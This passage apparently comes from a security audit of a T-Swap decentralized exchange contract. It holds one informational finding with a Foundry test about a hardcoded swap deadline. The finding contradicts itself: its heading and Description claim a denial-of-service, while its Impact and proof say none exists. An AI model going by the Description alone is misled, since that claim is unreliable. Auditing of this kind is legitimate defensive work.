        tokenSymbol = s;
    } catch {
        tokenSymbol = "UNK";
    }

    string memory lpName = string.concat("T-Swap ", tokenName);
    string memory lpSymbol = string.concat("ts", tokenSymbol);
    // ... create pool as before
}
```



# Info Risk Findings

## [I-1]. DOS issue in TSwapPool::sellPoolTokens

## Description
The `sellPoolTokens` function acts as a wrapper for `swapExactOutput`, but it hardcodes the `deadline` parameter to `uint64(block.timestamp)`. The `revertIfDeadlinePassed` modifier checks `if (deadline < uint64(block.timestamp))`. If a user's transaction submitted via `sellPoolTokens` is not included in the same block it was submitted in (e.g., it is pending in the mempool and a miner includes it in the next block), the transaction will fail. This is because the new block's timestamp will be greater than the `deadline` set in the previous block. This allows miners to selectively cause these transactions to fail, creating a Denial of Service vector.

## Impact
No exploitable denial-of-service exists. `sellPoolTokens` calls `swapExactOutput` with `uint64(block.timestamp)` evaluated at runtime. Inside the same transaction `revertIfDeadlinePassed` compares this value against `block.timestamp`, which is identical, so the check passes. The function behaves as intended and only lacks user-controlled flexibility.

## Proof of Concept
An attacker/miner cannot force a revert:
1. User submits a transaction that will invoke `sellPoolTokens`.
2. When the transaction is finally mined (no matter how many blocks later), the EVM evaluates `block.timestamp` **at the moment of execution**.
3. `sellPoolTokens` passes this exact value as `deadline` to `swapExactOutput`.
4. `revertIfDeadlinePassed` verifies `deadline < block.timestamp` which is `false` because both values are equal.
5. Execution continues and the swap succeeds.

Thus the alleged DoS condition cannot be triggered.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract NoDosTest is Test {
    TSwapPool pool;
    MockERC20 poolToken;
    MockERC20 weth;
    address user = address(1);

    function setUp() public {
        poolToken = new MockERC20("PT", "PT");
        weth      = new MockERC20("WETH", "WETH");
        pool      = new TSwapPool(address(poolToken), address(weth), "LP", "LP");

        // seed reserves so the swap path does not revert for zero liquidity
        poolToken.mint(address(pool), 100 ether);
        weth.mint(address(pool), 100 ether);

        // fund user
        poolToken.mint(user, 10 ether);
        vm.prank(user);
        poolToken.approve(address(pool), type(uint256).max);
    }

    function testSellPoolTokensSucceedsAfterDelay() public {
        vm.warp(1000);
        bytes memory calldata_ = abi.encodeWithSelector(TSwapPool.sellPoolTokens.selector, 1 ether);

        // simulate miner including the tx in a later block
        vm.warp(1013);
        vm.prank(user);
        (bool ok, ) = address(pool).call(calldata_);
        assertTrue(ok, "should not revert – no DoS");
    }
}

## Suggested Mitigation
No security fix required. If desired for UX, expose a `deadline` parameter so users can choose custom expiry, matching the pattern of other pool functions.



